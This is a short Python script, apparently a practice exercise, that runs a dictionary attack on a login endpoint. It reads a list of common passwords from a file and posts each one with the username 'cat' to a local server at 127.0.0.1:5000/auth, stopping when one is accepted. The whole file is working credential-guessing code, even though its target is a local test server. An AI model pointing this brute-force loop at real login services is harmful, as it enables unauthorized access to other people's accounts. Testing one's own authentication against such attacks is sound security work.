import requests
with open("pop_psw.txt") as passwords_file:
    passwords = passwords_file.readlines()
# open file and create the var with text from file
clean_passwords = []
clean_passwords = [password[:-1] for password in passwords]
# del from strings \n

for password in clean_passwords:
    print(password)
    response = requests.post('http://127.0.0.1:5000/auth', json={'login': 'cat', 'password': password})
    if response.status_code == 200:
        print("Success!", 'cat', password)
        break
# post request with json file(in file login and password from pop_psw.txt)